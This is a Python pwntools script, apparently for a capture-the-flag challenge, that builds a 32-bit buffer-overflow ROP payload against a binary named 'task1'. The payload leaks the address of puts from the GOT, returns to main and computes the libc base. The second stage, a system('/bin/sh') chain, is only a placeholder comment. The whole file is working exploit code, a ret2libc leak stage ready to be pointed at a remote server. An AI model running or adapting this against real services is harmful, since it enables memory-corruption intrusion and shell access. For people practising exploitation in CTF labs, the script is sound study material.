from pwn import *

# 1. Configuration and Constants
context.arch = 'i386' # Set architecture to 32-bit (x86)
context.binary = './task1' # Load the ELF file
# Use the addresses you collected
PADDING_SIZE = 60
PUTS_PLT = 0x4f0
PUTS_GOT = 0x1fd0
MAIN_ADDR = 0x6f5

# --- You must replace this with the actual libc file used by the challenge ---
# This file is necessary to find the static offsets
try:
    # If the challenge provides a libc, use it. Otherwise, use your local one for testing.
    libc = ELF('./libc.so.6') 
except:
    log.error("Libc file not found. Please obtain the correct libc.so.6 for the challenge.")
    exit()

# 2. Establish Connection
# Change to remote('ip', port) for the live CTF server
io = process('./task1') 
# io.recvuntil(b'Prompt:') # Uncomment this if the binary has a prompt

# 3. Create the Leak Payload (32-bit ROP)
# The 32-bit calling convention requires arguments to be pushed onto the stack.
# Stack: [puts@PLT] [Return Address] [Argument 1]

leak_payload = b"A" * PADDING_SIZE
leak_payload += p32(PUTS_PLT)  # 1. Call puts() to print the address
leak_payload += p32(MAIN_ADDR) # 2. Return to the start of main function to run again
leak_payload += p32(PUTS_GOT)  # 3. The argument for puts (the address to print)

log.info("Sending Stage 1 (Libc Leak) payload...")
io.sendline(leak_payload)

# 4. Receive and Calculate Libc Base
# You may need to adjust the number of io.recvline() calls based on the binary's output
io.recvlines(2) # Consume junk lines/prompts

# The next 4 bytes is the leaked live address of puts
LEAKED_PUTS = u32(io.recv(4))
log.success(f"Successfully leaked puts@libc: {hex(LEAKED_PUTS)}")

# Calculate the Libc Base Address
PUTS_OFFSET = libc.symbols['puts'] 
LIBC_BASE = LEAKED_PUTS - PUTS_OFFSET
log.success(f"Calculated Libc Base Address: {hex(LIBC_BASE)}")

# --- At this point, you are ready for Stage 2 ---
# (The code to create the final system("/bin/sh") ROP chain goes here)

io.close()
